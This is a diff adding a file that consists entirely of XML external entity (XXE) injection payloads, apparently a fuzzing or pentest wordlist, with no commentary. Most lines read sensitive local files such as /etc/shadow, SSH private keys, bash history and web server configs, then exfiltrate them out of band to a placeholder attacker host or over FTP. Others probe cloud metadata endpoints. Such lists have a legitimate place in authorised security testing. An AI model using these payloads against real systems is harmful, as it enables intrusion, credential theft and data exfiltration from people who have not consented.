@@ -1,0 +1,50 @@
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?x=%file;'>">%eval;%exfil;]>
+<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%init;%trick;]>
+<!DOCTYPE root [<!ENTITY % param1 "<!ENTITY &#x25; param2 'file:///etc/passwd'>">%param1;%param2;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com"><!ENTITY callhome SYSTEM "http://ATTACKER-SERVER.com/?%xxe;">]>
+<!DOCTYPE doc [<!ENTITY % oob SYSTEM "http://ATTACKER-SERVER.com/oob.xml">%oob;%external;]>
+<!DOCTYPE test [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net">%xxe;]>
+<!DOCTYPE data [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/combine.dtd">%dtd;]>
+<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%param1;%param2;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
+<!DOCTYPE doc [<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?x=%file;'>">%eval;%exfil;]>
+<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/">%p1;]>
+<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/x">%p1;%p2;]>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///proc/self/environ"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%send;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">%xxe;]>
+<!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com:8080/evil.dtd">%dtd;%all;]>
+<!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://ATTACKER-SERVER.com/param.dtd">%pe;%param;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///var/www/html/config.php"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/exfil.dtd">%dtd;]>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/shadow"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/?data=%file;'>">%eval;%send;]>
+<!DOCTYPE foo [<!ENTITY % a SYSTEM "http://ATTACKER-SERVER.com">%a;]>
+<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/hosts"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%exfil;]>
+<!DOCTYPE root [<!ENTITY % param "<!ENTITY &#x26; exfil SYSTEM 'http://ATTACKER-SERVER.com/?data=test'>">%param;]>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER-SERVER.com/%file;'>">%eval;%exfil;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ATTACKER-SERVER.com/xxe.dtd">%xxe;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///var/log/apache2/access.log"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/log.dtd">%dtd;]>
+<!DOCTYPE data [<!ENTITY % param1 "<!ENTITY &#x25; param2 '<!ENTITY &#x26; xxe SYSTEM \"http://ATTACKER-SERVER.com\">'>">%param1;%param2;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe?payload=test">%xxe;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?%file;'>">%eval;%exfil;]>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///home/user/.ssh/id_rsa"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/ssh.dtd">%dtd;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/%0a">%xxe;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///proc/version"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/?v=%file;'>">%eval;%send;]>
+<!DOCTYPE data [<!ENTITY % wrapper "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'>">%wrapper;%file;]>
+<!DOCTYPE foo [<!ENTITY % param SYSTEM "http://ATTACKER-SERVER.com/param.xml">%param;%data;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/group"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/exfil.dtd">%dtd;%send;]>
+<!DOCTYPE data [<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/?data=exfil'>">%all;%send;]>
+<!DOCTYPE foo [<!ENTITY % base "http://ATTACKER-SERVER.com"><!ENTITY % xxe SYSTEM "%base;/evil.dtd">%xxe;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/mysql/my.cnf"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/mysql?c=%file;'>">%eval;%exfil;]>
+<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/remote.dtd">%remote;%payload;%exfil;]>
+<!DOCTYPE foo [<!ENTITY % param "<!ENTITY &#x26; internal 'http://127.0.0.1'>">%param;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///var/www/html/index.php"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/php.dtd">%dtd;%grab;]>
+<!DOCTYPE data [<!ENTITY % nested "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'><!ENTITY &#x25; eval '<!ENTITY &#x26; exfil SYSTEM \"http://ATTACKER-SERVER.com/?%file;\">'>">%nested;%eval;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://ATTACKER-SERVER.com/xxe.dtd">%xxe;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/nginx/nginx.conf"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER-SERVER.com/nginx?conf=%file;'>">%eval;%send;]>
+<!DOCTYPE data [<!ENTITY % param1 SYSTEM "http://ATTACKER-SERVER.com/1.dtd"><!ENTITY % param2 SYSTEM "http://ATTACKER-SERVER.com/2.dtd">%param1;%param2;]>
+<!DOCTYPE foo [<!ENTITY % wrapper "<!ENTITY &#x26; file SYSTEM 'file:///etc/passwd'>">%wrapper;]>
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///root/.bash_history"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/history.dtd">%dtd;%exfil;]>
